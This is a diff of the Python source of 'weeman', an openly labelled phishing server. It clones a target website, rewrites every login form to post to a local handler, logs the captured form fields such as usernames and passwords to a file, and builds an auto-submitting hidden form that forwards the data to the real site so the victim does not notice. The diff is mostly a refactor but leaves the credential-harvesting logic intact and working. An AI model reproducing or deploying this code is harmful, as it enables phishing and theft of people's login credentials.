@@ -1,28 +1,19 @@
-#!/usr/bin/env python2
 ##
-## weeman - http server for phishing.
+## httpd.py - the main httpd server
 ##
-## Written by Hypsurus <hypsurus@mail.ru>
+## Written by @Hypsurus
 ##
 
-import sys
-import os
 import SimpleHTTPServer
 import SocketServer
 import urllib2
 import cgi
+import os
 from socket import error as socerr
-from core.misc import *
-from core.complete import complete,array 
-
-try:
-    from bs4 import BeautifulSoup as bs
-except ImportError:
-    printt(1, "Please install BeautifulSoup to continue.")
-
-__author__ = "Hypsurus <hypsurus@mail.ru>"
-__version__ = "1.2"
-__codename__ = "MOTerm"
+from core.config import __version__
+from core.config import __codename__
+from core.misc import printt
+from bs4 import BeautifulSoup as bs
 
 class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     ## Set server version
@@ -36,6 +27,7 @@ class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
             environ={'REQUEST_METHOD':'POST',
                      'CONTENT_TYPE':self.headers['Content-Type'],})
         try:
+            from core.shell import url
             logger = open("%s.log" %url.replace("https://", "").replace("http://", "").split("/")[0], "w+")
             logger.write("## Data for %s\n\n" %url)
             for tag in form.list:
@@ -45,6 +37,7 @@ class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
                 printt(2, "%s => %s" %(key,value))
                 logger.write("%s => %s\n" %(key,value))
             logger.close()
+            from core.shell import action_url
             create_post(url,action_url, post_request)
             SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
         except socerr as e:
@@ -64,12 +57,15 @@ class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
 
 class weeman(object):
     def __init__(self, url,port):
+        from core.shell import url
+        from core.shell import port
         self.port = port
         self.httpd = None
         self.url = url
         self.form_url = None;
 
     def request(self,url):
+            from core.shell import user_agent
             opener = urllib2.build_opener()
             opener.addheaders = [('User-Agent', user_agent)]
             return opener.open(self.url).read()
@@ -83,104 +79,31 @@ class weeman(object):
 
         for tag in data.find_all("form"):
             tag['method'] = "post"
-            tag['action'] = "./red.html"
-
-
+            tag['action'] = "ref.html"
         with open("index.html", "w") as index:
             index.write(data.prettify().encode('utf-8'))
             index.close()
-        printt(3, "the HTML page will redirect to ./red.html, with POST request.")
+        printt(3, "the HTML page will redirect to ref.html ...")
     def serve(self):
-        printt(3, "Starting Weeman %s server on 0.0.0.0:%d" %(__version__, self.port))
+        printt(3, "\033[01;35mStarting Weeman %s server on 0.0.0.0:%d\033[00m" %(__version__, self.port))
         self.httpd = SocketServer.TCPServer(("", self.port),handler)
         self.httpd.serve_forever()
     
     def cleanup(self):
         printt(3, "\nRunning cleanup ...")
-        if os.path.exists("index.html") and os.path.exists("red.html"):
+        if os.path.exists("index.html") and os.path.exists("ref.html"):
             os.remove("index.html")
-            os.remove("red.html")
-
+            os.remove("ref.html")
 
 def create_post(url,action_url, post_request):
-    printt(3, "Creating red.html file ...")
-    red = open("red.html","w")
+    printt(3, "Creating ref.html ...")
+    red = open("ref.html","w")
     red.write("<body><form id=\"ff\" action=\"%s\" method=\"post\" >\n" %action_url)
     for post in post_request:
         key,value = post.split()
         red.write("<input name=\"%s\" value=\"%s\" type=\"hidden\" >\n" %(key,value))
     red.write("<input name=\"login\" type=\"hidden\">")
     red.write("<script langauge=\"javascript\">document.forms[\"ff\"].submit();</script>")
-
     red.close()
 
-def shell():
-    global url
-    global action_url
-    global user_agent
 
-    url = "http://localhost"
-    port = 8080
-    action_url = "http://localhost/login"
-    user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
-
-
-    complete(array)
-    print(open("core/logo.txt", "r").read())
-    print("\t  Weeman %s (%s) by Hypsurus" %(__version__, __codename__))
-    print("\t\'There are plenty of fish in the sea\'")
-    print("\t-------------------------------------\n")
-    while True:
-        try:
-            an = raw_input("(weeman) : ")
-            prompt = an.split()
-            if not prompt:
-                print("Error: What? try help.")
-            elif prompt[0] == ";" or prompt[0] == "clear":
-                print("\033[H\033[J")
-            elif prompt[0] == "q" or prompt[0] == "quit":
-                printt(2,"bye bye!")
-                break;
-            elif prompt[0] == "help" or prompt[0] == "?":
-                print_help()
-            elif prompt[0] == "show":
-                l = 11 + len(url)
-                sys.stdout.write("\t")
-                print("-" * l)
-                print("\turl        : %s " %url)
-                print("\tport       : %d " %(port))
-                print("\taction_url : %s " %(action_url))
-                print("\tuser_agent : %s " %(user_agent))
-                sys.stdout.write("\t")
-                print("-" * l)
-            elif prompt[0] == "set":
-                if prompt[1] == "port":
-                    port = int(prompt[2])
-                if prompt[1] == "url":
-                    url = str(prompt[2])
-                if prompt[1] == "action_url":
-                    action_url = str(prompt[2])
-                if prompt[1] == "user_agent":
-                    prompt.pop(0)
-                    u = str()
-                    for x in prompt:
-                        u+=" "+x
-                    user_agent = str(u.replace("user_agent", ""))
-            elif prompt[0] == "run" or prompt == "r":
-                s = weeman(url,port)
-                s.clone()
-                s.serve()
-            else:
-                print("Error: \'%s\' What? try help." %prompt[0])
-
-        except KeyboardInterrupt:
-            s = weeman(url,port)
-            s.cleanup()
-            print("\nInterrupt ...")
-        except Exception as e:
-            printt(3, "Error: Weeman recived error! (%s)" %(str(e)))
-def main():
-    shell()
-
-if __name__ == '__main__':
-    main()
